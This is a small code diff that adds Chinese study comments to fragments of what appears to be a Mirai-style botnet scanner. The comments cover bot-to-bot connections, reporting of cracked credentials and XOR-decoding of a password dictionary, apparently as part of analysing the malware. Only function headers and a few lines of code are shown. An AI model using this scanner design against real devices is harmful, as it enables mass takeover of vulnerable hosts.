@@ -643,6 +643,7 @@ void scanner_kill(void)
     kill(scanner_pid, 9);
 }
 
+//建立连接？？？？　　bot 与　bot 间需要建立链接么？
 static void setup_connection(struct scanner_connection *conn)
 {
     struct sockaddr_in addr = {0};
@@ -898,6 +899,7 @@ static struct scanner_auth *random_auth_entry(void)
     return NULL;
 }
 
+//上报扫描结果
 static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *auth)
 {
     struct sockaddr_in addr;
@@ -960,6 +962,8 @@ static void report_working(ipv4_t daddr, uint16_t dport, struct scanner_auth *au
     exit(0);
 }
 
+
+//对字典中的字符串进行异或解密
 static char *deobf(char *str, int *len)
 {
     int i;
